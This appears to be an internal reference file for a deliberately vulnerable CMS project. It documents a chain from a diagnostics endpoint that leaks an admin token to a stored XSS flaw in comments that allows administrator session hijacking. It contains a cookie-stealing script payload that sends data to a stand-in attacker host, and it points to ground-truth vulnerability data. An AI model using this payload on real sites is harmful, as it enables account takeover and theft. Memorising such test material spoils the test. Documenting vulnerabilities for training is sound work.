# Chained Vulnerability Scenarios — Cms

## Chain: "Diagnostics Configuration Disclosure → Admin session hijacking via Stored XSS"

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | Debug status leaks editor token key | Medium | A05 | `src/index.js` → `GET /api/system/diagnostics` |
| 2 | Comment retrieval renders raw XSS tags | High | A03 | `src/index.js` → `GET /api/posts/:id/comments` |


**Attack narrative**: 1. The attacker queries `/api/system/diagnostics?debug=true` to obtain the editor token `CMS-ADMIN-EDITOR-KEY-xyz9988`.
2. Using this token in the headers, they bypass standard login filters.
3. The attacker posts a comment containing a script tag to steal active user cookies: `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`.
4. The administrator visits the post comment management panel.
5. The script runs in the admin's browser, hijacking their active session cookie.

**Combined Impact**: `account_takeover` — Attacker hijacks victim administrator accounts.

---

_This file is for internal reference. Ground truth vulnerability data is maintained in [.vulns](.vulns)._
